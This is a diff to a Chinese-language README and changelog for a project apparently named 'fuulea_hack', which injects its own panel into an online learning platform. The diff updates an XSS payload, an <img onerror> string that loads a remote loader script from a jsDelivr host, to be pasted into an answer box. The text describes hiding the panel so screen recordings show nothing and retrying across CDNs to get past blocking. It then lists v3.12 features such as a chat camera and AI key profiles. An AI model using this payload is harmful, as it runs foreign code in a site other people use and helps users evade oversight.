@@ -7,7 +7,7 @@
 贴进「注释填空」的输入框，随便答错提交：
 
 ```html
-<img src=x onerror="with(document)body.appendChild(createElement('script')).src='https://fastly.jsdelivr.net/gh/zhaoqinhao123/fuulea_hack@3.10/loader.js'">
+<img src=x onerror="with(document)body.appendChild(createElement('script')).src='https://fastly.jsdelivr.net/gh/zhaoqinhao123/fuulea_hack@3.12/loader.js'">
 ```
 
 154 字符，输入框没有长度限制，直接粘贴即可。面板出现在右下角。**再注入一次就是隐形开关**：面板开着时注入 → 整块隐藏；再注入 → 显形。藏起来时页面里只剩你原本的内容，录屏、投屏都不留痕迹。
@@ -27,6 +27,19 @@
 > 为什么不用 GitLab `/-/raw/`：它返回 `text/plain` + `nosniff`，`<script>` 标签拒执行。jsDelivr 走 GitHub 并给正确的 JS MIME，所以当主源。
 >
 > `cdn.jsdelivr.net` 在国内常被重置，所以注入串默认用 `fastly.jsdelivr.net`；loader 自身与模块加载会按 `cdn` → `fastly` → `gcore` → raw.githubusercontent → GitLab API 依次重试。
+
+## v3.12
+
+- **聊天室新增网页相机（拍照 / 录像，直接发对话框）**：输入行 📷 按钮打开全屏相机，拍完按「发送」即上传并作为图片消息发出；录像同样直接发出。相机代码抽成公共模块 `mods/cam.js`，聊天室和「相机 / 本地媒体」页用的是同一套界面。
+- **录像带声音**：录像时单独申请麦克风并与视频轨合成，录进声音；麦克风被拒绝则自动静音录制并在界面上说明。
+- **所有拍照页快门移到右侧**：聊天室相机、AI 网页相机、「相机 / 本地媒体」页统一为「✕ 右上、🔄 左侧、白色快门右下」，单手更容易按到；AI 相机的变焦条移回顶部居中。
+- **新增拍照分辨率选项**：相机顶部可选 4K / 2K / 1080P / 720P（长边 3840 / 2560 / 1920 / 1280），设置存 `fh:cam:res`，三个相机共用；默认 2K。
+- **修「相机拍的照片传不上去」**：根因是 v3.10 把拍照提到 4K 后仍输出 **PNG**，单张常 10–25MB，超过 GitLab 仓库接口限制；而且失败提示只藏在按钮 `title` 里，看起来像没反应。现在拍照统一输出 JPEG（质量 0.92），上传前再兜底压到 2560 长边；失败会直接弹出「上传失败：HTTP 413 …」，并提示去设置里检查 Token / 权限。
+- **修「上传按钮看不见」**：以前没设置上传 Token 时 ⬆ 按钮根本不渲染，现在按钮常显，点了会说明「先去 🤖 AI 网页 → 设置 → 上传 Token 填 Token」。
+- **查看媒体点关闭立即停止播放**：聊天室的语音现在有 ⏹ 停止按钮；播放另一条语音 / 打开视频会自动停掉上一条；关闭聊天室、最小化或切走时统一调用 `stopAllPlayback()`。媒体查看器关闭时暂停并释放视频，不再后台继续响。
+- **AI 配置支持保存多份**：设置面板顶部新增「配置」一行，可 ＋ 另存为新配置、✎ 重命名、🗑 删除，下拉即切换。每份配置包含 API Key、API 地址、模型名、接口协议（Chat Completions / Responses）以及扫描到的模型列表，存本机 `fh:ai:profiles`；有上传 Token 时会随加密配置一起自动同步到云端 GitLab（换设备登录账号 + 「更新配置」即可恢复）。
+- **图片消息直接显示缩略图**：聊天室收到的图片消息不必先点开，滚动到可见时自动加载缩略图（懒加载）。
+- 版本号 `TAG` / AI 头栏 / 聊天室徽标 / 主面板标签统一升到 3.12。
 
 ## v3.11
 
